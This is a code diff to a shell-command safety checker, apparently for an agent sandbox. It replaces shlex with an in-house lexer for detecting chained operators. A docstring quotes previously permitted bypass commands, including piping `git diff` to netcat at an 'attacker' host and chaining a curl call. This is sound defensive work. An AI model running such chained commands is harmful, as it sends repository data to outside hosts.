@@ -38,7 +38,6 @@ from __future__ import annotations
 import os
 import re
 import secrets
-import shlex
 import shutil
 import subprocess
 from dataclasses import dataclass, field
@@ -446,7 +445,7 @@ def verify_no_path_escape(path: str | Path, workspace_root: str | Path) -> Path:
 _SHELL_OPERATOR_TOKENS: frozenset[str] = frozenset({
     "&&", "||", ";", ";;", "|", "|&", "&", "\n", "(", ")", "<", ">", ">>", "<<",
 })
-# Command substitution survives shlex tokenization glued to its neighbours, so
+# Command substitution survives lexing glued to its neighbours, so
 # it is matched as a substring rather than as a token. ANSI-C quoting
 # (ARIA-HIGH-443) is matched alike: it closes its quote where no lexer here
 # would, so an operator it hides is invisible to the token check.
@@ -470,12 +469,10 @@ def shell_control_operator(argv: list[str] | tuple[str, ...]) -> str | None:
     `git diff | nc attacker 4444` and `git status && curl http://x` were all
     ALLOWED, while their unchained forms were correctly refused.
 
-    Tokenized rather than regex-scanned, because the distinction that matters
-    is quoting: `git commit -m 'fix A && B'` contains `&&` as DATA and must
-    still be allowed, while `git status && git push` contains it as an
-    OPERATOR and must not. `shlex` with `punctuation_chars=True` splits
-    operators into their own tokens even when unspaced (`git diff|nc x`) and
-    leaves quoted text intact, which is exactly that distinction.
+    Quote-aware rather than regex-scanned, because the distinction that
+    matters is quoting: `git commit -m 'fix A && B'` contains `&&` as DATA and
+    must still be allowed, while `git status && git push` contains it as an
+    OPERATOR and must not, glued (`git diff|nc x`) or spaced.
 
     A multi-element argv is checked token-by-token: it is passed to
     `subprocess` as a list, so an operator only has effect if the caller made
@@ -507,9 +504,8 @@ def shell_control_operator(argv: list[str] | tuple[str, ...]) -> str | None:
     operator = _command_policy.unmodelled_shell_syntax(line)
     if operator is not None:
         return operator
-    try:
-        shlex.split(line)
-    except ValueError:
+    # The policy's one lexer (ARIA-MEDIUM-538), linear in the line.
+    if _command_policy.shell_words(line) is None:
         return "unlexable_command"
     return None
 
